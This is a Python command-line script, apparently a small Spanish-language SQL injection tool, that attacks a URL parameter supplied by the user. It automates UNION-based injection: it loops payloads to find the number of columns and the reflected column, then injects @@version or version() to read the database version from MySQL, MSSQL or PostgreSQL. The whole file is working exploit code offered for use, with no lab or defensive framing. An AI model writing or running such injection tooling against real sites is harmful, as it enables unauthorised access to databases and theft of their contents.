#!/usr/bin/env python3
import requests
import argparse
from urllib.parse import quote_plus

# Colores
GREEN = "\033[0;32m\033[1m"
RED = "\033[0;31m\033[1m"
BLUE = "\033[0;34m\033[1m"
PINK = "\033[0;95m\033[1m"
YELLOW = "\033[0;33m\033[1m"
PURPLE = "\033[0;35m\033[1m"
TURQUOISE = "\033[0;36m\033[1m"
GRAY = "\033[0;37m\033[1m"
ENDC = "\033[0m\033[0m"

class SQLiScanner:
    def __init__(self, url, dbms='mysql', output_file=None, num_cols=None, visible_col=None):
        self.url = url
        self.dbms = dbms.lower()
        self.output_file = output_file
        self.num_cols = num_cols
        self.visible_col = visible_col
        self.session = requests.Session()

    def send_request(self, payload):
        try:
            full_url = self.url + quote_plus(payload)
            r = self.session.get(full_url, timeout=5)
            return r.text
        except requests.exceptions.RequestException:
            return ""

    def union_extract_version(self):
        # Si no se proporcionan, intentar detectar columnas y columna visible
        num_cols = self.num_cols or self.detect_columns_union()
        if not num_cols:
            return None

        visible_col = self.visible_col or self.detect_visible_column(num_cols)
        if not visible_col:
            return None

        # Construir payload según DBMS
        if self.dbms == 'mysql' or self.dbms == 'mssql':
            version_expr = "@@version"
        elif self.dbms == 'postgres':
            version_expr = "version()"
        else:
            print("[-] DBMS no soportado para extracción UNION")
            return None

        columns = ["NULL"] * num_cols
        columns[visible_col-1] = version_expr
        payload = f" UNION SELECT {','.join(columns)};-- -"

        response = self.send_request(payload)
        return response.strip()

    # Funciones de detección automática (fallback)
    def detect_columns_union(self, max_columns=10):
        print("[*] Detecting number of columns for UNION SELECT...")
        for i in range(1, max_columns+1):
            payload = "' UNION SELECT " + ",".join(["NULL"]*i) + "-- -"
            response = self.send_request(payload)
            if "error" not in response.lower():
                print(f"[+] Number of columns detected: {i}")
                return i
        print("[-] Could not detect number of columns.")
        return None

    def detect_visible_column(self, num_cols):
        print("[*] Detecting visible column...")
        for i in range(1, num_cols+1):
            test_string = "TEST123"
            columns = ["NULL"] * num_cols
            columns[i-1] = f"'{test_string}'"
            payload = f"' UNION SELECT {','.join(columns)}-- -"
            response = self.send_request(payload)
            if test_string in response:
                print(f"[+] Visible column found at position: {i}")
                return i
        print("[-] No visible column detected.")
        return None

    def output(self, text):
        print(text)
        if self.output_file:
            with open(self.output_file, 'a') as f:
                f.write(text + '\n')

    def run(self, technique):
        if technique != "union":
            self.output("[-] Solo se puede usar union en esta version.")
            return

        self.output(f"{YELLOW}[+]{ENDC} Corriendo extracción UNION-based {BLUE}{self.dbms.upper()}{ENDC}")
        version = self.union_extract_version()
        if version:
            self.output(f"{YELLOW}[+]{ENDC} Version de base de datos:{BLUE}{version}{ENDC}")
        else:
            self.output("[-] Extracción fallida.")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="URL objetivo con el parametro vulnerable")
    parser.add_argument("-t", "--technique", choices=["union"], default="union", help="Técnica de inyección")
    parser.add_argument("--dbms", choices=["mysql","postgres","mssql"], default="mysql", help="Manejador de base de datos")
    parser.add_argument("-o", "--output", help="Guardar en un archivo")
    parser.add_argument("--columns", type=int, help="Número de columnas en el query")
    parser.add_argument("--visible", type=int, help="Numero de columna visible")

    args = parser.parse_args()

    scanner = SQLiScanner(args.url, args.dbms, args.output, args.columns, args.visible)
    scanner.run(args.technique)

if __name__ == "__main__":
    main()
